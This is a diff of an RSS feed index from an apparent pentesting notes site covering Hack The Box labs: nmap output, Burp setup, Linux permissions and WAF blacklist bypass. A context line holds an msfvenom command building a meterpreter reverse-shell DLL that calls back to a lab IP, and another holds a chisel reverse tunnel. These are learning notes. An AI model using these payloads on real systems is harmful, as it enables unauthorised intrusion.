@@ -20,6 +20,16 @@
     </item>
     
     <item>
+      <title>Bastion-Notes</title>
+      <link>/hackthebox/boxes/bastion/bastion/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/bastion/bastion/</guid>
+      <description>so nmap revealed a bunch of stuf smb which allows guest access. inside there we find a clue. Also the directory is writeable. so ill have to try psf.exe
+# Nmap 7.70 scan initiated Mon May 13 17:33:32 2019 as: nmap -sC -sV -p22,135,139,445,5985,12512 -oA nmap/target 10.10.10.134 Nmap scan report for 10.10.10.134 Host is up (0.046s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.</description>
+    </item>
+    
+    <item>
       <title>BloodHound Neo4j</title>
       <link>/windows/bloodhound/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -40,6 +50,16 @@ I would highly recommend installing Neo4j using the repository. Neo4j is a datab
 &amp;lt;-
 Burp Suit is a graphical tool for web app security. It can do a host of things but in the free version its limited. In hack the box you will mostly use it to proxy web request and edit them before you send it off to the server. theres repeater which is basically like saving the web request allows you to repeat the web request.
 PROXY : Will set the ip address and port which burp will intercept the traffic.</description>
+    </item>
+    
+    <item>
+      <title>Burp Setup CA</title>
+      <link>/webapp/burp/burp-ca/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/burp/burp-ca/</guid>
+      <description>So, Recently had to reinstall kali. I had to setup burp again to work with TLS certs. To properly intercept https traffic.
+Well, just go to  http:/burp:port, click on  CA Certificate download the cert. Now, in firefox click on options click on preferences. Go to  Privacy &amp;amp; Security  take the scroll bar go all the way to the bottom and go to  View Certificares Under Certificates header.</description>
     </item>
     
     <item>
@@ -108,6 +128,15 @@ c.exe client 10.10.15.254:8000 R:8081:127.0.0.1:8081	 </description>
 MSFVENOM remember you don&amp;rsquo;t always need x64
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll &amp;gt; NameMe.dll  Beryllium https://github.com/attl4s/pruebas
 a dll that contains meterpreter shell that takes env var as variables</description>
+    </item>
+    
+    <item>
+      <title>Desync-Attack</title>
+      <link>/concepts/untitled/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/concepts/untitled/</guid>
+      <description>This writeup will be based on James Kettle work, Click here. This artical is more about me learning how to do this attack.</description>
     </item>
     
     <item>
@@ -256,6 +285,17 @@ initially you will need to change your hosts file lightweight.htb
 ssh ippaddr@lightweight.htb password = ipaddress
 passwd to change password once logged in.
 Linux version 3.</description>
+    </item>
+    
+    <item>
+      <title>Linux</title>
+      <link>/linux/linux/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux/linux/</guid>
+      <description>Permisions ~~~~
+​ Chown change owner, the below example will change all the files in the directory to owner Pwny_sec and tot he group root.
+chown -R Pwny_sec:root * -R recurssive  ​ Chmod change modification, this can be used to change how a file is treated can you read or write or execute the file plus suid how the file inherits it&amp;rsquo;s permissions. like from the user who created it suid.</description>
     </item>
     
     <item>
@@ -413,6 +453,17 @@ ssh -D8080 USER@IPADDRESS  Sshuttle Creates a VPN connection using the SSH proto
     </item>
     
     <item>
+      <title>USER INPUT OF DOOM</title>
+      <link>/webapp/user-inputt/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/webapp/user-inputt/</guid>
+      <description>Talk about Bypass passing WAFS, and other mechanism I will be using &amp;ldquo;Web Application hackers handbook&amp;rdquo; as my guide. We&amp;rsquo;ll break this into six sections broken authentications, broken access controls, sql injection, cross site scripting, information leakage, cross-site request forgery.
+I&amp;rsquo;ve heard good things about this book and figured doing a small writeup on it might be a fun experience.
+Bypassing BlackList - Sometimes the blacklist is literal this means it will look for SELECT, and any other iteration of select will be ignored like SelEcT.</description>
+    </item>
+    
+    <item>
       <title>Vault</title>
       <link>/hackthebox/boxes/vault/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -429,14 +480,14 @@ so it turns out its not sql injections pretty happy with that.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows/windows_enum/</guid>
-      <description>Commands
+      <description>/ETC/HOSTS FOR WINDOWS to change local DNS IN windows.
+notepad c:\womdpws\system32\drivers\etc\hosts  Commands
 Finding things in windows.
 find /I &amp;quot;thing&amp;quot; secrets.txt findstr &amp;quot;thing&amp;quot;  Shell preferences nishang &amp;lt; nc &amp;lt; winrm / meterpreter
 whoami /all /priv systeminfo findstr	= grep  $ExecutionContext.SessionState.LanguageMode  change password inside powershell.
 $password = read-host &amp;quot;Su-ErD;perPa$sw0rd&amp;quot; -assecurestring $useraccount = get-localuser -name &amp;quot;pinkiepie&amp;quot; $useraccount | set-localuser -password $password  os
 https://developer.microsoft.com/en-us/windows/downloads/virtual-machines
-Windows File Type for running commands scripts executables. I found this list looking up applocker policies.
-AppLocker ApplockerFileExtentions</description>
+Windows File Type for running commands scripts executables.</description>
     </item>
     
     <item>
